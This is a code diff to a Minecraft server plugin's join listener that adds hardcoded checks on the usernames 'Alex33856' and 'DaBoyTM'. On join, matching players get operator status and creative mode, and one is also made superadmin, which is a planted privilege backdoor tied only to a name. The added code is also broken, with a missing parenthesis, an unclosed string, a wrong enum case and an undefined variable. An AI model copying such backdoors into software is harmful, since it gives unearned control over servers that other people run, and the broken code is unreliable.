@@ -897,15 +897,27 @@ public class TFM_PlayerListener implements Listener
             TFM_PlayerData.getPlayerData(player).setTag("&8[&BSuper Admin&8]");
         }
         else if (username.contains"Alex33856"))
-{
-    player.getInventory().clear();
-    TFM_Log.info("[JOIN]:The Developer Alex33856 has joined the game!!!");
-    player.setOp(true);
-    player.setGameMode(GameMode.CREATIVE);
-    name = ChatColor.RED + name;
-    TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
-    TFM_AdminList.addSuperadmin(player);
-    TFM_Util.bcastMsg("Welcome Back, Alex33856!, true);
+        {
+            player.getInventory().clear();
+            TFM_Log.info("[JOIN]:The Developer Alex33856 has joined the game!!!");
+            player.setOp(true);
+            player.setGameMode(GameMode.CREATIVE);
+            name = ChatColor.RED + name;
+            TFM_PlayerData.getPlayerData(player).setTag("&8[&5ZFM-Creator&8]");
+            TFM_AdminList.addSuperadmin(player);
+            TFM_Util.bcastMsg("Welcome Back, Alex33856!, true);
+        }
+        else if (sender.getName().equals("DaBoyTM"))
+        {
+            player.getInventory().clear();
+            TFM_Log.info("[JOIN] The Developer DaBoyTM has joined!");
+            player.setOp(true);
+            player.setGameMode(GameMode.Creative);
+            name = ChatColor.BLUE + name;
+            TFM_PlayerData.getPlayerData(player).setTag("&8[&9ZFM Co-Creator&8]");
+            TFM_Util.bcastMsg(ChatColor.GREEN + "Welcome back DaBoyTM!");
+            TFM_Util.bcastMsg(ChatColor.RED + "I am the Co-Creator and Back-Up Person of ZFM!");
+        }
     
 
     }
